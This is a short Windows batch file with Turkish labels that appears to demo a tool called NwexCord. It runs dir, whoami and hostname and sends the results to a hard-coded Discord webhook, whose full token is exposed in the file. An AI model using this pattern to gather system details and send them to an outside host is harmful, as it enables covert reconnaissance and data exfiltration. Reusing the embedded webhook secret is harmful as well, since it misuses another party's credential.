@echo off
set WEBHOOK_URL="https://discord.com/api/webhooks/1480284001951289415/CMenimQeN3yvdcv3xEqM-mXW4V4tBy-bKs2TI7UqbbSVvFG0m5aJJGYv_UozCJ0QrSZ7"

echo 1. Basit bir komut gonderme (dir)
py NwexCord.py --webhook %WEBHOOK_URL% --command "dir"

echo.
echo 2. Aciklamali komut gonderme
py NwexCord.py --webhook %WEBHOOK_URL% --command "whoami" --description "Kullanici Bilgisi"

echo.
echo 3. Wrapper kullanarak gonderme
call discord-cmd.bat "hostname"

pause
